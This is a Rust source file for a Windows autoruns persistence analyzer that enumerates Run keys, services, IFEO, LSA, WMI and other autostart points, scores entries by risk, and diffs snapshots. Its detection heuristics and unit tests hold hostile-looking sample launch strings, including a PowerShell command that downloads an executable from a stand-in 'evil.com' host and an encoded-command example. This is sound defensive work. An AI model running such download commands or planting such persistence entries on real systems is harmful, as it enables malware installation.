//! `autoruns_analyzer` — Autoruns-equivalent
//!
//! Enumerates all persistence points: Run/RunOnce, Services, Scheduled Tasks,
//! Browser extensions, Winlogon, `AppInit_DLLs`, LSA providers, `Image File Execution`
//! Options, Winsock LSP, `AppCert` DLLs, COM objects, Print Monitors, etc.

use std::collections::HashMap;
use std::fmt;
use std::path::Path;

use serde::{Deserialize, Serialize};

use crate::SysinternalsError;

// ─── Extended AutorunCategory ─────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum PersistenceCategory {
    // Registry logon triggers
    RunKey,
    RunOnceKey,
    RunOnceExKey,
    RunServicesKey,
    RunServicesOnceKey,
    // Winlogon hooks
    WinlogonNotify,
    WinlogonUserinit,
    WinlogonShell,
    // Services
    ServiceAutoStart,
    ServiceBootStart,
    ServiceSystemStart,
    // Scheduled Tasks
    ScheduledTask,
    // AppInit & AppCert
    AppInitDlls,
    AppCertDlls,
    // LSA
    LsaAuthPackages,
    LsaSecurityPackages,
    LsaNotificationPackages,
    // Image File Execution Options (IFEO)
    IfeoDebugger,
    // Winsock / Network Providers
    WinsockLsp,
    NetworkProvider,
    // Shell hooks
    ShellExecuteHooks,
    ShellIconOverlay,
    ShellServiceObjectDelayLoad,
    // Browser extensions
    InternetExplorerBho,
    InternetExplorerToolbar,
    ChromeExtension,
    FirefoxExtension,
    EdgeExtension,
    // Boot execute
    BootExecute,
    // WMI
    WmiEventConsumer,
    WmiEventFilter,
    WmiBinding,
    // Startup folders
    UserStartupFolder,
    CommonStartupFolder,
    // COM objects
    ComServer,
    ComInprocServer,
    // Print monitors
    PrintMonitor,
    // Print providers (Windows)
    PrintProvider,
    // Office macros / addins
    OfficeAddin,
    // .NET Framework
    DotNetDomainAssembly,
    // Misc
    ScreenSaver,
    ActiveSetup,
    Explorer,
    PowerShellProfile,
    Unknown,
}

impl fmt::Display for PersistenceCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let s = match self {
            Self::RunKey => "Run Key",
            Self::RunOnceKey => "Run Once Key",
            Self::RunOnceExKey => "Run Once Ex Key",
            Self::RunServicesKey => "Run Services Key",
            Self::RunServicesOnceKey => "Run Services Once Key",
            Self::WinlogonNotify => "Winlogon Notify",
            Self::WinlogonUserinit => "Winlogon Userinit",
            Self::WinlogonShell => "Winlogon Shell",
            Self::ServiceAutoStart => "Service (AutoStart)",
            Self::ServiceBootStart => "Service (BootStart)",
            Self::ServiceSystemStart => "Service (SystemStart)",
            Self::ScheduledTask => "Scheduled Task",
            Self::AppInitDlls => "AppInit DLLs",
            Self::AppCertDlls => "AppCert DLLs",
            Self::LsaAuthPackages => "LSA Auth Packages",
            Self::LsaSecurityPackages => "LSA Security Packages",
            Self::LsaNotificationPackages => "LSA Notification Packages",
            Self::IfeoDebugger => "IFEO Debugger",
            Self::WinsockLsp => "Winsock LSP",
            Self::NetworkProvider => "Network Provider",
            Self::ShellExecuteHooks => "Shell Execute Hooks",
            Self::ShellIconOverlay => "Shell Icon Overlay",
            Self::ShellServiceObjectDelayLoad => "Shell Service Object DelayLoad",
            Self::InternetExplorerBho => "IE Browser Helper Object",
            Self::InternetExplorerToolbar => "IE Toolbar",
            Self::ChromeExtension => "Chrome Extension",
            Self::FirefoxExtension => "Firefox Extension",
            Self::EdgeExtension => "Edge Extension",
            Self::BootExecute => "Boot Execute",
            Self::WmiEventConsumer => "WMI Event Consumer",
            Self::WmiEventFilter => "WMI Event Filter",
            Self::WmiBinding => "WMI Binding",
            Self::UserStartupFolder => "User Startup Folder",
            Self::CommonStartupFolder => "Common Startup Folder",
            Self::ComServer => "COM Server",
            Self::ComInprocServer => "COM InprocServer32",
            Self::PrintMonitor => "Print Monitor",
            Self::PrintProvider => "Print Provider",
            Self::OfficeAddin => "Office Add-in",
            Self::DotNetDomainAssembly => ".NET Domain Assembly",
            Self::ScreenSaver => "Screen Saver",
            Self::ActiveSetup => "Active Setup",
            Self::Explorer => "Explorer",
            Self::PowerShellProfile => "PowerShell Profile",
            Self::Unknown => "Unknown",
        };
        write!(f, "{s}")
    }
}

// ─── PersistenceEntry ─────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceEntry {
    pub category: PersistenceCategory,
    /// Human-readable location (registry path, file path, task name).
    pub location: String,
    /// Entry name.
    pub name: String,
    /// The full launch string / value data.
    pub launch_string: String,
    /// Path to the image/DLL on disk.
    pub image_path: String,
    /// Whether the image file exists on disk.
    pub image_exists: bool,
    /// Authenticode signature status.
    pub signed: Option<bool>,
    /// SHA-256 of the image (if checked).
    pub sha256: Option<String>,
    /// Publisher from version info.
    pub publisher: Option<String>,
    /// Description from version info.
    pub description: Option<String>,
    /// Whether this entry is enabled.
    pub enabled: bool,
    /// Whether this entry is from a known-good system location.
    pub is_system: bool,
    /// Additional notes or anomalies.
    pub notes: Vec<String>,
    /// Heuristic risk score 0-100.
    pub risk_score: u32,
}

impl PersistenceEntry {
    #[must_use]
    pub fn new(
        category: PersistenceCategory,
        location: impl Into<String>,
        name: impl Into<String>,
        launch_string: impl Into<String>,
        image_path: impl Into<String>,
    ) -> Self {
        let image_path = image_path.into();
        let image_exists = Path::new(&image_path).exists();
        let mut entry = Self {
            category,
            location: location.into(),
            name: name.into(),
            launch_string: launch_string.into(),
            image_path,
            image_exists,
            signed: None,
            sha256: None,
            publisher: None,
            description: None,
            enabled: true,
            is_system: false,
            notes: Vec::new(),
            risk_score: 0,
        };
        entry.compute_risk_score();
        entry
    }

    fn compute_risk_score(&mut self) {
        let mut score: u32 = 0;
        let lp = self.image_path.to_lowercase();
        let ls = self.launch_string.to_lowercase();

        // Suspicious locations.
        if lp.contains("\\temp\\") || lp.contains("\\tmp\\") {
            score += 30;
            self.notes.push("Image in temp directory".into());
        }
        if lp.contains("\\appdata\\") {
            score += 20;
            self.notes.push("Image in AppData".into());
        }
        if lp.contains("\\downloads\\") {
            score += 25;
            self.notes.push("Image in Downloads".into());
        }
        if !self.image_exists && !self.image_path.is_empty() {
            score += 15;
            self.notes.push("Image file does not exist on disk".into());
        }
        if self.signed == Some(false) && self.enabled {
            score += 20;
            self.notes.push("Unsigned image".into());
        }
        // Suspicious launch strings.
        if ls.contains("powershell") || ls.contains("cmd.exe") || ls.contains("wscript") || ls.contains("cscript") {
            score += 15;
            self.notes.push("Scripting host in launch string".into());
        }
        if ls.contains("http://") || ls.contains("https://") {
            score += 20;
            self.notes.push("URL in launch string".into());
        }
        if ls.contains("-enc") || ls.contains("-encodedcommand") {
            score += 25;
            self.notes.push("Encoded command detected".into());
        }
        // High-risk categories.
        if matches!(
            self.category,
            PersistenceCategory::IfeoDebugger
                | PersistenceCategory::AppInitDlls
                | PersistenceCategory::AppCertDlls
                | PersistenceCategory::WinsockLsp
                | PersistenceCategory::LsaAuthPackages
                | PersistenceCategory::LsaSecurityPackages
                | PersistenceCategory::WmiEventConsumer
                | PersistenceCategory::BootExecute
        ) {
            score += 20;
        }
        self.risk_score = score.min(100);
    }

    #[must_use]
    pub fn is_suspicious(&self) -> bool {
        self.risk_score >= 30 || self.signed == Some(false)
    }

    #[must_use]
    pub fn to_csv_row(&self) -> String {
        format!(
            "{},{},{},{},{},{},{},{}",
            crate::csv_field(&self.category.to_string()),
            crate::csv_field(&self.location),
            crate::csv_field(&self.name),
            crate::csv_field(&self.image_path),
            self.image_exists,
            self.signed
                .map_or("unknown", |s| if s { "signed" } else { "unsigned" }),
            self.enabled,
            self.risk_score,
        )
    }
}

// ─── Known good baseline ─────────────────────────────────────────────────────

/// Registry paths for all known persistence locations.
pub mod persistence_locations {
    // Run keys.
    pub const RUN_HKLM: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    pub const RUN_HKCU: &str = r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    pub const RUN_WOW_HKLM: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run";
    pub const RUNONCE_HKLM: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";
    pub const RUNONCE_HKCU: &str = r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";
    pub const RUNSERVICES_HKLM: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices";
    pub const RUNSERVICES_HKCU: &str = r"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices";

    // Winlogon.
    pub const WINLOGON: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
    pub const WINLOGON_NOTIFY: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify";

    // AppInit.
    pub const APP_INIT: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";
    pub const APP_INIT_WOW: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows";

    // AppCert DLLs.
    pub const APP_CERT: &str = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls";

    // Boot execute.
    pub const BOOT_EXECUTE: &str = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager";

    // LSA.
    pub const LSA: &str = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa";

    // IFEO.
    pub const IFEO: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";

    // Winsock.
    pub const WINSOCK_PROVIDERS: &str = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries";
    pub const WINSOCK_NAMESPACE: &str = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries";

    // Network providers.
    pub const NETWORK_PROVIDERS: &str = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order";

    // Shell.
    pub const SHELL_EXECUTE_HOOKS: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks";
    pub const SHELL_ICON_OVERLAYS: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers";
    pub const SHELL_SERVICE_OBJECTS: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad";

    // IE/COM.
    pub const IE_BHO: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects";
    pub const ACTIVE_SETUP: &str = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components";

    // Services.
    pub const SERVICES: &str = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services";

    // Startup folders.
    pub const STARTUP_USER: &str = r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup";
    pub const STARTUP_COMMON: &str = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp";

    // Screen saver.
    pub const SCREEN_SAVER: &str = r"HKEY_CURRENT_USER\Control Panel\Desktop";

    // PowerShell profiles.
    pub const POWERSHELL_PROFILE_USER: &str = r"%USERPROFILE%\Documents\WindowsPowerShell\Profile.ps1";
    pub const POWERSHELL_PROFILE_SYSTEM: &str = r"C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1";
}

// ─── AutorunsAnalyzer ─────────────────────────────────────────────────────────

pub struct AutorunsAnalyzer {
    entries: Vec<PersistenceEntry>,
    scan_errors: Vec<String>,
}

impl AutorunsAnalyzer {
    #[must_use]
    pub const fn new() -> Self {
        Self {
            entries: Vec::new(),
            scan_errors: Vec::new(),
        }
    }

    /// Add a manually provided entry (used by platform backends).
    pub fn add_entry(&mut self, entry: PersistenceEntry) {
        self.entries.push(entry);
    }

    /// Add an error message from a scan attempt.
    pub fn add_error(&mut self, msg: impl Into<String>) {
        self.scan_errors.push(msg.into());
    }

    /// Return all entries.
    #[must_use]
    pub fn all_entries(&self) -> &[PersistenceEntry] {
        &self.entries
    }

    /// Filter by category.
    #[must_use]
    pub fn by_category(&self, cat: PersistenceCategory) -> Vec<&PersistenceEntry> {
        self.entries.iter().filter(|e| e.category == cat).collect()
    }

    /// Filter suspicious entries.
    #[must_use]
    pub fn suspicious_entries(&self) -> Vec<&PersistenceEntry> {
        self.entries.iter().filter(|e| e.is_suspicious()).collect()
    }

    /// Filter unsigned entries.
    #[must_use]
    pub fn unsigned_entries(&self) -> Vec<&PersistenceEntry> {
        self.entries
            .iter()
            .filter(|e| e.signed == Some(false) && e.enabled)
            .collect()
    }

    /// Filter entries where image does not exist.
    #[must_use]
    pub fn missing_image_entries(&self) -> Vec<&PersistenceEntry> {
        self.entries
            .iter()
            .filter(|e| !e.image_exists && !e.image_path.is_empty())
            .collect()
    }

    /// Filter entries in high-risk categories.
    #[must_use]
    pub fn high_risk_entries(&self) -> Vec<&PersistenceEntry> {
        self.entries
            .iter()
            .filter(|e| e.risk_score >= 50)
            .collect()
    }

    /// Group entries by category.
    #[must_use]
    pub fn grouped_by_category(&self) -> HashMap<PersistenceCategory, Vec<&PersistenceEntry>> {
        let mut map: HashMap<PersistenceCategory, Vec<&PersistenceEntry>> = HashMap::new();
        for e in &self.entries {
            map.entry(e.category).or_default().push(e);
        }
        map
    }

    /// Sort entries by risk score descending.
    pub fn sort_by_risk(&mut self) {
        self.entries.sort_by_key(|b| std::cmp::Reverse(b.risk_score));
    }

    /// Total count per category.
    #[must_use]
    pub fn category_counts(&self) -> HashMap<String, usize> {
        let mut map = HashMap::new();
        for e in &self.entries {
            *map.entry(e.category.to_string()).or_default() += 1;
        }
        map
    }

    /// Diff against a previous snapshot.
    #[must_use]
    pub fn diff_with(&self, baseline: &[PersistenceEntry]) -> AutorunsDiff {
        AutorunsDiff::compute(baseline, &self.entries)
    }

    /// Export to CSV.
    #[must_use]
    pub fn to_csv(&self) -> String {
        let mut out = String::from(
            "Category,Location,Name,ImagePath,Exists,Signed,Enabled,RiskScore\n",
        );
        for e in &self.entries {
            out.push_str(&e.to_csv_row());
            out.push('\n');
        }
        out
    }

    /// # Errors
    /// Returns an error if the underlying operation fails.
    pub fn to_json(&self) -> Result<String, SysinternalsError> {
        serde_json::to_string_pretty(&self.entries)
            .map_err(|e| SysinternalsError::InvalidData(e.to_string()))
    }

    /// Scan errors encountered during enumeration.
    #[must_use]
    pub fn scan_errors(&self) -> &[String] {
        &self.scan_errors
    }

    /// Count of total entries.
    #[must_use]
    pub const fn count(&self) -> usize {
        self.entries.len()
    }

    /// Return entries matching a search string.
    #[must_use]
    pub fn search(&self, query: &str) -> Vec<&PersistenceEntry> {
        let q = query.to_lowercase();
        self.entries
            .iter()
            .filter(|e| {
                e.name.to_lowercase().contains(&q)
                    || e.image_path.to_lowercase().contains(&q)
                    || e.launch_string.to_lowercase().contains(&q)
                    || e.location.to_lowercase().contains(&q)
            })
            .collect()
    }
}

impl Default for AutorunsAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

// ─── AutorunsDiff ─────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutorunsDiff {
    pub added: Vec<PersistenceEntry>,
    pub removed: Vec<PersistenceEntry>,
    pub changed: Vec<(PersistenceEntry, PersistenceEntry)>,
}

impl AutorunsDiff {
    fn entry_key(e: &PersistenceEntry) -> String {
        format!("{}:{}:{}", e.category, e.location, e.name)
    }

    #[must_use]
    pub fn compute(baseline: &[PersistenceEntry], current: &[PersistenceEntry]) -> Self {
        let baseline_map: HashMap<String, &PersistenceEntry> =
            baseline.iter().map(|e| (Self::entry_key(e), e)).collect();
        let current_map: HashMap<String, &PersistenceEntry> =
            current.iter().map(|e| (Self::entry_key(e), e)).collect();

        let added: Vec<PersistenceEntry> = current
            .iter()
            .filter(|e| !baseline_map.contains_key(&Self::entry_key(e)))
            .cloned()
            .collect();

        let removed: Vec<PersistenceEntry> = baseline
            .iter()
            .filter(|e| !current_map.contains_key(&Self::entry_key(e)))
            .cloned()
            .collect();

        let changed: Vec<(PersistenceEntry, PersistenceEntry)> = current
            .iter()
            .filter_map(|cur| {
                let key = Self::entry_key(cur);
                baseline_map.get(&key).and_then(|base| {
                    if base.launch_string != cur.launch_string
                        || base.image_path != cur.image_path
                        || base.enabled != cur.enabled
                    {
                        Some(((*base).clone(), cur.clone()))
                    } else {
                        None
                    }
                })
            })
            .collect();

        Self {
            added,
            removed,
            changed,
        }
    }

    #[must_use]
    pub const fn is_clean(&self) -> bool {
        self.added.is_empty() && self.removed.is_empty() && self.changed.is_empty()
    }

    #[must_use]
    pub const fn total_changes(&self) -> usize {
        self.added.len() + self.removed.len() + self.changed.len()
    }

    /// Return only added entries that are suspicious.
    #[must_use]
    pub fn suspicious_additions(&self) -> Vec<&PersistenceEntry> {
        self.added.iter().filter(|e| e.is_suspicious()).collect()
    }
}

// ─── AutorunsReport ───────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutorunsReport {
    pub total: usize,
    pub suspicious_count: usize,
    pub unsigned_count: usize,
    pub missing_image_count: usize,
    pub category_summary: HashMap<String, usize>,
    pub top_risk_entries: Vec<PersistenceEntry>,
}

impl AutorunsReport {
    #[must_use]
    pub fn from_analyzer(analyzer: &AutorunsAnalyzer) -> Self {
        let entries = analyzer.all_entries();
        let suspicious_count = entries.iter().filter(|e| e.is_suspicious()).count();
        let unsigned_count = entries.iter().filter(|e| e.signed == Some(false)).count();
        let missing_image_count = entries.iter().filter(|e| !e.image_exists && !e.image_path.is_empty()).count();
        let category_summary = analyzer.category_counts();
        let mut top_risk: Vec<PersistenceEntry> = entries
            .iter()
            .filter(|e| e.risk_score >= 30)
            .cloned()
            .collect();
        top_risk.sort_by_key(|b| std::cmp::Reverse(b.risk_score));
        top_risk.truncate(10);

        Self {
            total: entries.len(),
            suspicious_count,
            unsigned_count,
            missing_image_count,
            category_summary,
            top_risk_entries: top_risk,
        }
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_entry(
        cat: PersistenceCategory,
        name: &str,
        image: &str,
        launch: &str,
    ) -> PersistenceEntry {
        PersistenceEntry::new(cat, "HKLM\\Run", name, launch, image)
    }

    #[test]
    fn test_persistence_entry_risk_temp_dir() {
        let e = make_entry(
            PersistenceCategory::RunKey,
            "evil",
            "C:\\Temp\\evil.exe",
            "C:\\Temp\\evil.exe",
        );
        assert!(e.risk_score >= 30);
        assert!(e.is_suspicious());
    }

    #[test]
    fn test_persistence_entry_risk_encoded_command() {
        let e = make_entry(
            PersistenceCategory::RunKey,
            "ps",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -enc dGVzdA==",
        );
        assert!(e.notes.iter().any(|n| n.contains("Encoded")));
        assert!(e.risk_score >= 25);
    }

    #[test]
    fn test_persistence_entry_ifeo_high_risk() {
        let e = make_entry(
            PersistenceCategory::IfeoDebugger,
            "notepad.exe",
            "C:\\malware\\debugger.exe",
            "C:\\malware\\debugger.exe",
        );
        // IFEO gets +20 base score.
        assert!(e.risk_score >= 20);
    }

    #[test]
    fn test_persistence_entry_url_in_launch() {
        let e = make_entry(
            PersistenceCategory::RunKey,
            "downloader",
            "C:\\Temp\\dl.exe",
            "powershell.exe -c iwr https://evil.com -o x.exe",
        );
        assert!(e.notes.iter().any(|n| n.contains("URL")));
    }

    #[test]
    fn test_autoruns_analyzer_add_and_query() {
        let mut analyzer = AutorunsAnalyzer::new();
        analyzer.add_entry(make_entry(
            PersistenceCategory::RunKey,
            "evil",
            "C:\\Temp\\evil.exe",
            "C:\\Temp\\evil.exe",
        ));
        analyzer.add_entry(make_entry(
            PersistenceCategory::ServiceAutoStart,
            "legit",
            "C:\\Windows\\System32\\legit.exe",
            "legit.exe -k netsvcs",
        ));
        assert_eq!(analyzer.count(), 2);
        assert!(!analyzer.suspicious_entries().is_empty());
    }

    #[test]
    fn test_autoruns_analyzer_by_category() {
        let mut analyzer = AutorunsAnalyzer::new();
        analyzer.add_entry(make_entry(
            PersistenceCategory::RunKey,
            "r",
            "C:\\Windows\\x.exe",
            "x.exe",
        ));
        analyzer.add_entry(make_entry(
            PersistenceCategory::ScheduledTask,
            "t",
            "C:\\Windows\\y.exe",
            "y.exe",
        ));
        assert_eq!(analyzer.by_category(PersistenceCategory::RunKey).len(), 1);
        assert_eq!(analyzer.by_category(PersistenceCategory::ScheduledTask).len(), 1);
    }

    #[test]
    fn test_autoruns_analyzer_search() {
        let mut analyzer = AutorunsAnalyzer::new();
        analyzer.add_entry(make_entry(
            PersistenceCategory::RunKey,
            "mimikatz",
            "C:\\tools\\mimikatz.exe",
            "mimikatz.exe",
        ));
        analyzer.add_entry(make_entry(
            PersistenceCategory::RunKey,
            "legit",
            "C:\\Windows\\legit.exe",
            "legit.exe",
        ));
        let results = analyzer.search("mimikatz");
        assert_eq!(results.len(), 1);
    }

    #[test]
    fn test_autoruns_analyzer_sort_by_risk() {
        let mut analyzer = AutorunsAnalyzer::new();
        analyzer.add_entry(make_entry(
            PersistenceCategory::RunKey,
            "low_risk",
            "C:\\Windows\\System32\\svchost.exe",
            "svchost.exe -k",
        ));
        analyzer.add_entry(make_entry(
            PersistenceCategory::IfeoDebugger,
            "high_risk",
            "C:\\Temp\\debug.exe",
            "debug.exe",
        ));
        analyzer.sort_by_risk();
        assert!(
            analyzer.all_entries()[0].risk_score >= analyzer.all_entries()[1].risk_score
        );
    }

    #[test]
    fn test_autoruns_diff_added() {
        let baseline = Vec::new();
        let current = vec![make_entry(
            PersistenceCategory::RunKey,
            "new",
            "C:\\new.exe",
            "new.exe",
        )];
        let diff = AutorunsDiff::compute(&baseline, &current);
        assert_eq!(diff.added.len(), 1);
        assert!(diff.removed.is_empty());
        assert!(!diff.is_clean());
    }

    #[test]
    fn test_autoruns_diff_removed() {
        let baseline = vec![make_entry(
            PersistenceCategory::RunKey,
            "old",
            "C:\\old.exe",
            "old.exe",
        )];
        let current = Vec::new();
        let diff = AutorunsDiff::compute(&baseline, &current);
        assert_eq!(diff.removed.len(), 1);
    }

    #[test]
    fn test_autoruns_diff_changed() {
        let baseline = vec![make_entry(
            PersistenceCategory::RunKey,
            "entry",
            "C:\\old.exe",
            "old.exe",
        )];
        let current = vec![make_entry(
            PersistenceCategory::RunKey,
            "entry",
            "C:\\new.exe",
            "new.exe",
        )];
        let diff = AutorunsDiff::compute(&baseline, &current);
        assert_eq!(diff.changed.len(), 1);
    }

    #[test]
    fn test_autoruns_diff_clean() {
        let entry = make_entry(PersistenceCategory::RunKey, "same", "C:\\same.exe", "same.exe");
        let entry2 = entry.clone();
        let diff = AutorunsDiff::compute(std::slice::from_ref(&entry), &[entry2]);
        assert!(diff.is_clean());
    }

    #[test]
    fn test_autoruns_report() {
        let mut analyzer = AutorunsAnalyzer::new();
        analyzer.add_entry(make_entry(
            PersistenceCategory::RunKey,
            "evil",
            "C:\\Temp\\evil.exe",
            "evil.exe",
        ));
        let report = AutorunsReport::from_analyzer(&analyzer);
        assert_eq!(report.total, 1);
        assert!(report.suspicious_count > 0);
    }

    #[test]
    fn test_category_display() {
        assert_eq!(PersistenceCategory::RunKey.to_string(), "Run Key");
        assert_eq!(PersistenceCategory::BootExecute.to_string(), "Boot Execute");
        assert_eq!(PersistenceCategory::WmiEventConsumer.to_string(), "WMI Event Consumer");
    }

    #[test]
    fn test_persistence_entry_csv_row() {
        let e = make_entry(PersistenceCategory::RunKey, "test", "C:\\test.exe", "test.exe");
        let csv = e.to_csv_row();
        assert!(csv.contains("Run Key"));
        assert!(csv.contains("test"));
    }
}
